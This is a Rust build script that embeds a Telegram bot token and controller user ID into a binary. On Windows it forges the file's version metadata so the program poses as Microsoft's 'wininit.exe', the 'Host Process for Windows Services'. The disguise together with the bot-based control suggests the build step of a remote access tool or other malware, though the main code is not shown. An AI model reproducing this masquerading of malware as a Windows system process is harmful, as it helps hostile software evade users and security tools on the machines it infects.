fn main() {
    let _ = dotenvy::dotenv();

    let token = std::env::var("TG_BOT_TOKEN")
        .expect("TG_BOT_TOKEN is not set — create a .env file with TG_BOT_TOKEN=...");
    let uid = std::env::var("TG_SUPER_USER_ID")
        .expect("TG_SUPER_USER_ID is not set — create a .env file with TG_SUPER_USER_ID=...");

    println!("cargo:rustc-env=BAKED_TOKEN={token}");
    println!("cargo:rustc-env=BAKED_UID={uid}");
    println!("cargo:rerun-if-env-changed=TG_BOT_TOKEN");
    println!("cargo:rerun-if-env-changed=TG_SUPER_USER_ID");
    println!("cargo:rerun-if-changed=.env");

    if cfg!(target_os = "windows") {
        let mut res = winres::WindowsResource::new();

        if std::path::Path::new("assets/icon.ico").exists() {
            res.set_icon("assets/icon.ico");
        }

        res.set("FileDescription", "Host Process for Windows Services");
        res.set("ProductName", "Microsoft® Windows® Operating System");
        res.set("CompanyName", "Microsoft Corporation");
        res.set(
            "LegalCopyright",
            "© Microsoft Corporation. All rights reserved",
        );
        res.set("OriginalFilename", "wininit.exe");
        res.set("InternalName", "wininit.exe");

        let version: Vec<u16> = env!("CARGO_PKG_VERSION")
            .split('.')
            .map(|s| s.parse::<u16>().unwrap_or(0))
            .collect();
        let major = version.first().copied().unwrap_or(0);
        let minor = version.get(1).copied().unwrap_or(0);
        let patch = version.get(2).copied().unwrap_or(0);
        res.set_version_info(
            winres::VersionInfo::PRODUCTVERSION,
            (major as u64) << 48 | (minor as u64) << 32 | (patch as u64) << 16,
        );
        res.set_version_info(
            winres::VersionInfo::FILEVERSION,
            (major as u64) << 48 | (minor as u64) << 32 | (patch as u64) << 16,
        );

        res.compile().unwrap();
    }
}
